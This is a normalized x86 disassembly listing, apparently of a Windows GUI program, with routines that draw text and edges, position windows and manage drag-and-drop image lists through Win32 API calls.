mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_457154
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406cdc
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_44f398
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_453940
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_450a20
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_451be4
sub_4571c0
push ebx
push esi
mov esi edx
call sub_466768
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406c64
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_450a20
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406c64
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_450a20
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_457224
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_453d08
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_45725c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_457254
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_45729c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44e954
mov dl 0x1
mov eax [ r-xdata ]
call sub_424d10
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_44e430
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_4572f8
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_4032b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44ea2c
test bl bl
jle r-xdata
xor eax eax
call sub_44ca24
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_457338
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_4252d4
xor eax eax
push ebp
push sub_4573d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_4256c8
xor eax eax
push ebp
push sub_4573b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4573b7
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_4256c8
retn
sub_4573e4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_457d1c
mov edx 0x80ffff
mov eax esi
call sub_44f9f4
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_425568
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_424cdc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_457450
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_452ee0
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40c30c
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_452e78
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_4574bc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_457512
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457519
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call ReleaseDC
retn
sub_457520
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4575b9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_4243f4
mov eax ebx
call sub_451b8c
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_44f854
mov eax [ ebp - 0x14 ]
call sub_40456c
push eax
mov eax [ ebx + 0x208 ]
call sub_425648
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4575c0
lea eax [ ebp - 0x14 ]
call sub_4040ac
retn
sub_4575c8
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_457634
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_4576bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4576c6
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040d0
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44f854
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_4254a8
mov edx eax
add edx 0x6
mov eax esi
call sub_44f010
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_44f854
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_4254c4
mov edx eax
add edx 0x4
mov eax esi
call sub_44f034
sub_4576cc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_4578a5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44f884
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_450ac4
mov eax [ esi ]
call sub_46cfa0
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_46cfac
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_46cfa0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_46cf94
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_46cfac
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_46cf88
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_46cf94
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_46cf88
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_453788
push 0x4
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4578ac
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_40436c
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_45a964
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call [ rw-data ]
sub_4578b4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4578dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_417358
mov eax esi
call sub_451b8c
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_40456c
push eax
mov eax [ esi + 0x208 ]
call sub_425648
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_457938
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_417358
call sub_440198
call sub_440278
test al al
jne r-xdata
call sub_440198
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_440504
push esp
push 0x1
push 0xf
push 0x0
call sub_440198
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_4402e8
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_4579a4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_454090
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_4579c8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_457a20
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_457ae0
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46d474
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42a4e8
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46d474
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42a4e8
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_457aec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45ca94
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_45cbd0
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_457b4c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45d500
mov eax ebx
call sub_45ca94
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x6a ] 0x0
je r-xdata
push esi
push 0x0
call ImageList_GetDragImage
sub_457b78
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_45ca94
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_457a20
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_457bd8
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_457aec
push 0x0
call ShowCursor
sub_457bd8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_45ca94
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_457c3c
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4579c8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_457c3c
push ebx
mov ebx eax
mov eax ebx
call sub_45ca94
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_457c60
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45ca94
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_4579c8
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_457cd4
push ebx
push esi
mov esi eax
mov eax esi
call sub_45ca94
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_457c3c
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_457b34
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_457d1c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_451d80
mov dl 0x1
mov eax [ r-xdata ]
call sub_424d10
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_44e430
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_457d78
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_4032b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_451ea4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_457dc8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4252d4
xor eax eax
push ebp
push sub_457e66
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_4256c8
xor eax eax
push ebp
push sub_457e43
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_44e448
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457e4a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_4256c8
retn
sub_457e78
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_457f0c
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_457e94
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_457f0c
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_458504
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_457f0c
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_457f40
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_457fd0
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
mov edx 0x2
call sub_457fd0
jmp r-xdata
retn
sub_457f88
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_45803c
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
mov edx 0x2
call sub_45803c
jmp r-xdata
retn
sub_457fd0
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_458404
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_45803c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_457ef0
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_458404
push eax
mov eax esi
call sub_457f40
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_458404
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_4580ec
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_457ef0
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_458504
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_45803c
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_457ef0
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_45803c
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_457f40
mov edx eax
add edx esi
mov eax ebx
call sub_45842c
mov edx edi
mov eax ebx
call sub_45842c
jmp r-xdata
mov eax ebx
call sub_45828c
mov eax ebx
call sub_4584dc
mov ebx eax
test ebx ebx
jne r-xdata
sub_458194
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_4040ac
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_404100
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
sub_4581d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_4034ac
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_458249
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_45056c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_45825c
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_4584dc
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_45828c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_45803c
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_45803c
mov esi eax
push ebp
call sub_45825c
pop ecx
